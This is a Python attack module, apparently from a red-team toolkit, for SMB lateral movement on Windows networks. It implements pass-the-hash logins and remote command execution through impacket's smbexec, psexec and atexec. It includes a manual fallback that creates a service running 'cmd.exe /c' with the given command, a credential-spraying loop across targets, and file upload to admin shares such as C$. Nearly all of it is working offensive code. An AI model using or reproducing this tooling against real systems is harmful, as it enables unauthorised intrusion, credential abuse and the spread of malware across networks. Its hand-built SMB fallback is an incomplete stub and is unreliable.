#!/usr/bin/env python3
"""
SMB 横向移动模块 - SMB Lateral Movement
功能: Pass-the-Hash、SMB 命令执行、文件传输
支持: impacket 库 + 纯 Python 回退
"""

import socket
import struct
import hashlib
import hmac
import os
import time
import logging
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
import threading

logger = logging.getLogger(__name__)

# 尝试导入 impacket
try:
    from impacket.smbconnection import SMBConnection as ImpacketSMB
    from impacket.dcerpc.v5 import transport, scmr
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    logger.warning("impacket not installed, using limited pure Python SMB")


class AuthMethod(Enum):
    """认证方式"""
    PASSWORD = "password"
    NTLM_HASH = "ntlm_hash"  # Pass-the-Hash
    KERBEROS = "kerberos"


@dataclass
class Credentials:
    """凭据"""
    username: str
    password: Optional[str] = None
    domain: str = ""
    ntlm_hash: Optional[str] = None  # LM:NT 格式
    aes_key: Optional[str] = None  # Kerberos AES key

    @property
    def auth_method(self) -> AuthMethod:
        if self.ntlm_hash:
            return AuthMethod.NTLM_HASH
        elif self.aes_key:
            return AuthMethod.KERBEROS
        return AuthMethod.PASSWORD

    @property
    def lm_hash(self) -> str:
        """获取 LM Hash"""
        if self.ntlm_hash and ':' in self.ntlm_hash:
            return self.ntlm_hash.split(':')[0]
        return "aad3b435b51404eeaad3b435b51404ee"  # 空 LM

    @property
    def nt_hash(self) -> str:
        """获取 NT Hash"""
        if self.ntlm_hash and ':' in self.ntlm_hash:
            return self.ntlm_hash.split(':')[1]
        elif self.ntlm_hash:
            return self.ntlm_hash
        return ""


@dataclass
class SMBShare:
    """SMB 共享"""
    name: str
    share_type: str
    remark: str
    permissions: List[str] = field(default_factory=list)


@dataclass
class SMBFile:
    """SMB 文件"""
    name: str
    size: int
    is_directory: bool
    created: str
    modified: str


@dataclass
class ExecResult:
    """执行结果"""
    success: bool
    output: str
    error: str = ""
    exit_code: int = 0


class SMBConnection:
    """
    SMB 连接封装

    支持:
    - 密码认证
    - Pass-the-Hash (PTH)
    - Kerberos 认证
    """

    def __init__(self, target: str, port: int = 445, timeout: float = 10.0):
        self.target = target
        self.port = port
        self.timeout = timeout
        self._conn = None
        self._authenticated = False

    def connect(self, creds: Credentials) -> bool:
        """
        建立 SMB 连接

        Args:
            creds: 凭据对象
        """
        if HAS_IMPACKET:
            return self._connect_impacket(creds)
        else:
            return self._connect_pure(creds)

    def _connect_impacket(self, creds: Credentials) -> bool:
        """使用 impacket 连接"""
        try:
            self._conn = ImpacketSMB(self.target, self.target, sess_port=self.port)

            if creds.auth_method == AuthMethod.NTLM_HASH:
                # Pass-the-Hash
                self._conn.login(
                    creds.username,
                    '',
                    creds.domain,
                    creds.lm_hash,
                    creds.nt_hash
                )
                logger.info(f"PTH authentication successful: {creds.username}@{self.target}")
            else:
                # 密码认证
                self._conn.login(
                    creds.username,
                    creds.password or '',
                    creds.domain
                )
                logger.info(f"Password authentication successful: {creds.username}@{self.target}")

            self._authenticated = True
            return True

        except Exception as e:
            logger.error(f"SMB connection failed: {e}")
            return False

    def _connect_pure(self, creds: Credentials) -> bool:
        """纯 Python SMB 连接 (简化版)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # 发送 SMB Negotiate
            negotiate = self._build_negotiate_request()
            sock.send(negotiate)

            response = sock.recv(4096)
            if not self._parse_negotiate_response(response):
                sock.close()
                return False

            # 发送 Session Setup (NTLM)
            if creds.auth_method == AuthMethod.NTLM_HASH:
                session_setup = self._build_session_setup_pth(creds)
            else:
                session_setup = self._build_session_setup_password(creds)

            sock.send(session_setup)
            response = sock.recv(4096)

            if self._check_auth_success(response):
                self._conn = sock
                self._authenticated = True
                logger.info(f"Pure Python SMB auth successful: {creds.username}@{self.target}")
                return True

            sock.close()
            return False

        except Exception as e:
            logger.error(f"Pure Python SMB failed: {e}")
            return False

    def _build_negotiate_request(self) -> bytes:
        """构建 SMB Negotiate 请求"""
        # SMB1 Negotiate Protocol Request (简化版)
        smb_header = b'\x00'  # Message Type
        smb_header += b'\x00\x00\x00'  # Length (placeholder)
        smb_header += b'\xffSMB'  # SMB Protocol
        smb_header += b'\x72'  # Command: Negotiate
        smb_header += b'\x00\x00\x00\x00'  # Status
        smb_header += b'\x18'  # Flags
        smb_header += b'\x53\xc8'  # Flags2
        smb_header += b'\x00' * 12  # Reserved
        smb_header += b'\x00\x00'  # TID
        smb_header += b'\xff\xfe'  # PID
        smb_header += b'\x00\x00'  # UID
        smb_header += b'\x00\x00'  # MID

        # Negotiate Dialect
        dialects = b'\x02NT LM 0.12\x00'
        word_count = b'\x00'
        byte_count = struct.pack('<H', len(dialects))

        body = word_count + byte_count + dialects
        length = struct.pack('>I', len(smb_header) + len(body) - 4)[1:]

        return smb_header[:1] + length + smb_header[4:] + body

    def _parse_negotiate_response(self, response: bytes) -> bool:
        """解析 Negotiate 响应"""
        if len(response) < 36:
            return False
        # 检查 SMB 签名
        if response[4:8] != b'\xffSMB':
            return False
        return True

    def _build_session_setup_pth(self, creds: Credentials) -> bytes:
        """构建 Pass-the-Hash 认证请求"""
        # 这是简化版本，实际需要完整的 NTLMSSP 实现
        # 生产环境应使用 impacket
        return self._build_session_setup_password(creds)

    def _build_session_setup_password(self, creds: Credentials) -> bytes:
        """构建密码认证请求"""
        # 简化的 Session Setup 请求
        smb_header = b'\x00\x00\x00\x00'  # NetBIOS header
        smb_header += b'\xffSMB'  # SMB Protocol
        smb_header += b'\x73'  # Command: Session Setup AndX
        smb_header += b'\x00\x00\x00\x00'  # Status
        smb_header += b'\x18'  # Flags
        smb_header += b'\x07\xc8'  # Flags2
        smb_header += b'\x00' * 12  # Reserved
        smb_header += b'\x00\x00'  # TID
        smb_header += b'\xff\xfe'  # PID
        smb_header += b'\x00\x00'  # UID
        smb_header += b'\x00\x00'  # MID

        return smb_header

    def _check_auth_success(self, response: bytes) -> bool:
        """检查认证是否成功"""
        if len(response) < 12:
            return False
        # 检查 NT_STATUS
        status = struct.unpack('<I', response[9:13])[0] if len(response) > 12 else 1
        return status == 0

    def list_shares(self) -> List[SMBShare]:
        """列出共享"""
        if not self._authenticated:
            return []

        shares = []

        if HAS_IMPACKET and self._conn:
            try:
                share_list = self._conn.listShares()
                for share in share_list:
                    shares.append(SMBShare(
                        name=share['shi1_netname'][:-1],
                        share_type=str(share['shi1_type']),
                        remark=share['shi1_remark'][:-1] if share['shi1_remark'] else ""
                    ))
            except Exception as e:
                logger.error(f"List shares failed: {e}")

        return shares

    def list_files(self, share: str, path: str = "\\") -> List[SMBFile]:
        """列出文件"""
        if not self._authenticated or not HAS_IMPACKET:
            return []

        files = []

        try:
            self._conn.connectTree(share)
            file_list = self._conn.listPath(share, path + "*")

            for f in file_list:
                files.append(SMBFile(
                    name=f.get_longname(),
                    size=f.get_filesize(),
                    is_directory=f.is_directory(),
                    created=str(f.get_ctime()),
                    modified=str(f.get_mtime())
                ))
        except Exception as e:
            logger.error(f"List files failed: {e}")

        return files

    def upload_file(self, share: str, local_path: str, remote_path: str) -> bool:
        """上传文件"""
        if not self._authenticated or not HAS_IMPACKET:
            return False

        try:
            with open(local_path, 'rb') as f:
                self._conn.putFile(share, remote_path, f.read)
            logger.info(f"Uploaded {local_path} to {share}:{remote_path}")
            return True
        except Exception as e:
            logger.error(f"Upload failed: {e}")
            return False

    def download_file(self, share: str, remote_path: str, local_path: str) -> bool:
        """下载文件"""
        if not self._authenticated or not HAS_IMPACKET:
            return False

        try:
            with open(local_path, 'wb') as f:
                self._conn.getFile(share, remote_path, f.write)
            logger.info(f"Downloaded {share}:{remote_path} to {local_path}")
            return True
        except Exception as e:
            logger.error(f"Download failed: {e}")
            return False

    def close(self):
        """关闭连接"""
        if self._conn:
            if HAS_IMPACKET:
                try:
                    self._conn.close()
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            else:
                try:
                    self._conn.close()
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        self._authenticated = False


class SMBLateral:
    """
    SMB 横向移动

    Usage:
        lateral = SMBLateral()

        # Pass-the-Hash 执行命令
        result = lateral.exec_command(
            target="192.168.1.100",
            creds=Credentials(
                username="administrator",
                ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
            ),
            command="whoami"
        )

        # 文件上传
        lateral.upload(target, creds, "/path/to/local", "C$\\Windows\\Temp\\file.exe")
    """

    def __init__(self, timeout: float = 30.0):
        self.timeout = timeout

    def exec_command(self,
                     target: str,
                     creds: Credentials,
                     command: str,
                     method: str = "smbexec") -> ExecResult:
        """
        执行远程命令

        Args:
            target: 目标主机
            creds: 凭据
            command: 命令
            method: 执行方法 (smbexec, psexec, atexec)
        """
        if not HAS_IMPACKET:
            return ExecResult(
                success=False,
                output="",
                error="impacket not installed, cannot execute commands"
            )

        if method == "smbexec":
            return self._exec_smbexec(target, creds, command)
        elif method == "psexec":
            return self._exec_psexec(target, creds, command)
        elif method == "atexec":
            return self._exec_atexec(target, creds, command)
        else:
            return ExecResult(success=False, output="", error=f"Unknown method: {method}")

    def _exec_smbexec(self, target: str, creds: Credentials, command: str) -> ExecResult:
        """SMBExec 方式执行"""
        try:
            from impacket.examples.smbexec import SMBEXEC

            if creds.auth_method == AuthMethod.NTLM_HASH:
                executer = SMBEXEC(
                    command,
                    None,
                    None,
                    creds.domain,
                    creds.username,
                    '',
                    creds.lm_hash,
                    creds.nt_hash,
                    None,
                    'SHARE'
                )
            else:
                executer = SMBEXEC(
                    command,
                    None,
                    None,
                    creds.domain,
                    creds.username,
                    creds.password,
                    '',
                    '',
                    None,
                    'SHARE'
                )

            executer.run(target)
            return ExecResult(success=True, output="Command executed")

        except ImportError:
            return self._exec_manual(target, creds, command)
        except Exception as e:
            return ExecResult(success=False, output="", error=str(e))

    def _exec_psexec(self, target: str, creds: Credentials, command: str) -> ExecResult:
        """PSExec 方式执行"""
        try:
            from impacket.examples.psexec import PSEXEC

            if creds.auth_method == AuthMethod.NTLM_HASH:
                executer = PSEXEC(
                    command,
                    None,
                    None,
                    creds.domain,
                    creds.username,
                    '',
                    creds.lm_hash,
                    creds.nt_hash,
                    None
                )
            else:
                executer = PSEXEC(
                    command,
                    None,
                    None,
                    creds.domain,
                    creds.username,
                    creds.password,
                    '',
                    '',
                    None
                )

            executer.run(target)
            return ExecResult(success=True, output="Command executed via PSExec")

        except ImportError:
            return ExecResult(success=False, output="", error="psexec module not available")
        except Exception as e:
            return ExecResult(success=False, output="", error=str(e))

    def _exec_atexec(self, target: str, creds: Credentials, command: str) -> ExecResult:
        """AtExec 方式执行 (通过计划任务)"""
        try:
            from impacket.examples.atexec import ATSVC_EXEC

            if creds.auth_method == AuthMethod.NTLM_HASH:
                executer = ATSVC_EXEC(
                    target,
                    creds.username,
                    '',
                    creds.domain,
                    creds.lm_hash,
                    creds.nt_hash,
                    None,
                    command
                )
            else:
                executer = ATSVC_EXEC(
                    target,
                    creds.username,
                    creds.password,
                    creds.domain,
                    '',
                    '',
                    None,
                    command
                )

            executer.run()
            return ExecResult(success=True, output="Command scheduled via AT")

        except ImportError:
            return ExecResult(success=False, output="", error="atexec module not available")
        except Exception as e:
            return ExecResult(success=False, output="", error=str(e))

    def _exec_manual(self, target: str, creds: Credentials, command: str) -> ExecResult:
        """手动 SCM 执行"""
        try:
            # 通过 SCM 创建服务执行命令
            string_binding = f'ncacn_np:{target}[\\pipe\\svcctl]'
            rpc_transport = transport.DCERPCTransportFactory(string_binding)

            if creds.auth_method == AuthMethod.NTLM_HASH:
                rpc_transport.set_credentials(
                    creds.username, '', creds.domain,
                    creds.lm_hash, creds.nt_hash
                )
            else:
                rpc_transport.set_credentials(
                    creds.username, creds.password or '', creds.domain
                )

            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            # 打开 SCM
            resp = scmr.hROpenSCManagerW(dce)
            sc_handle = resp['lpScHandle']

            # 创建服务
            service_name = f"YOURSERVICE{int(time.time())}"
            bin_path = f'cmd.exe /c {command}'

            try:
                resp = scmr.hRCreateServiceW(
                    dce, sc_handle, service_name, service_name,
                    lpBinaryPathName=bin_path,
                    dwStartType=scmr.SERVICE_DEMAND_START
                )
                service_handle = resp['lpServiceHandle']
            except (KeyError, OSError) as e:
                # 服务可能已存在，尝试打开
                logger.debug(f"Service create failed, trying open: {e}")
                resp = scmr.hROpenServiceW(dce, sc_handle, service_name)
                service_handle = resp['lpServiceHandle']

            # 启动服务
            try:
                scmr.hRStartServiceW(dce, service_handle)
            except (KeyError, OSError) as e:
                logger.debug(f"Service start issue (may be expected): {e}")

            # 删除服务
            scmr.hRDeleteService(dce, service_handle)
            scmr.hRCloseServiceHandle(dce, service_handle)
            scmr.hRCloseServiceHandle(dce, sc_handle)

            return ExecResult(success=True, output="Command executed via SCM")

        except Exception as e:
            return ExecResult(success=False, output="", error=str(e))

    def spray_credentials(self,
                          targets: List[str],
                          creds_list: List[Credentials],
                          callback: Optional[Callable] = None) -> Dict[str, Credentials]:
        """
        凭据喷洒

        Args:
            targets: 目标列表
            creds_list: 凭据列表
            callback: 成功回调

        Returns:
            成功的 target -> creds 映射
        """
        success = {}

        for target in targets:
            for creds in creds_list:
                conn = SMBConnection(target)
                if conn.connect(creds):
                    success[target] = creds
                    logger.info(f"Valid creds for {target}: {creds.username}")
                    if callback:
                        callback(target, creds)
                    conn.close()
                    break
                conn.close()

        return success


# 便捷函数
def pass_the_hash(target: str,
                  username: str,
                  ntlm_hash: str,
                  domain: str = "",
                  command: Optional[str] = None) -> Dict[str, Any]:
    """
    Pass-the-Hash 攻击

    Args:
        target: 目标主机
        username: 用户名
        ntlm_hash: NTLM Hash (LM:NT 或仅 NT)
        domain: 域名
        command: 要执行的命令 (可选)

    Returns:
        结果字典
    """
    creds = Credentials(
        username=username,
        ntlm_hash=ntlm_hash,
        domain=domain
    )

    conn = SMBConnection(target)
    if not conn.connect(creds):
        return {"success": False, "error": "Authentication failed"}

    result = {
        "success": True,
        "target": target,
        "username": username,
        "domain": domain,
        "auth_method": "pass_the_hash"
    }

    # 列出共享
    shares = conn.list_shares()
    result["shares"] = [s.name for s in shares]

    # 执行命令
    if command:
        lateral = SMBLateral()
        exec_result = lateral.exec_command(target, creds, command)
        result["command"] = command
        result["command_output"] = exec_result.output
        result["command_success"] = exec_result.success

    conn.close()
    return result


def smb_exec(target: str,
             username: str,
             password: str = "",
             ntlm_hash: str = "",
             domain: str = "",
             command: str = "whoami") -> Dict[str, Any]:
    """
    SMB 远程命令执行

    Args:
        target: 目标主机
        username: 用户名
        password: 密码 (与 ntlm_hash 二选一)
        ntlm_hash: NTLM Hash
        domain: 域名
        command: 命令
    """
    creds = Credentials(
        username=username,
        password=password if password else None,
        ntlm_hash=ntlm_hash if ntlm_hash else None,
        domain=domain
    )

    lateral = SMBLateral()
    result = lateral.exec_command(target, creds, command)

    return {
        "success": result.success,
        "output": result.output,
        "error": result.error,
        "target": target,
        "command": command
    }


def smb_upload(target: str,
               username: str,
               password: str,
               local_path: str,
               remote_path: str,
               share: str = "C$",
               domain: str = "") -> Dict[str, Any]:
    """上传文件到 SMB 共享"""
    creds = Credentials(username=username, password=password, domain=domain)

    conn = SMBConnection(target)
    if not conn.connect(creds):
        return {"success": False, "error": "Authentication failed"}

    success = conn.upload_file(share, local_path, remote_path)
    conn.close()

    return {
        "success": success,
        "target": target,
        "share": share,
        "local_path": local_path,
        "remote_path": remote_path
    }


def smb_download(target: str,
                 username: str,
                 password: str,
                 remote_path: str,
                 local_path: str,
                 share: str = "C$",
                 domain: str = "") -> Dict[str, Any]:
    """从 SMB 共享下载文件"""
    creds = Credentials(username=username, password=password, domain=domain)

    conn = SMBConnection(target)
    if not conn.connect(creds):
        return {"success": False, "error": "Authentication failed"}

    success = conn.download_file(share, remote_path, local_path)
    conn.close()

    return {
        "success": success,
        "target": target,
        "share": share,
        "remote_path": remote_path,
        "local_path": local_path
    }


if __name__ == "__main__":
    print("SMB Lateral Movement Module")
    print("=" * 50)
    print(f"impacket available: {HAS_IMPACKET}")
    print("\nUsage:")
    print("  from core.lateral import pass_the_hash, smb_exec")
    print("  result = pass_the_hash('192.168.1.100', 'admin', 'aad3b435:8846f7ea...')")
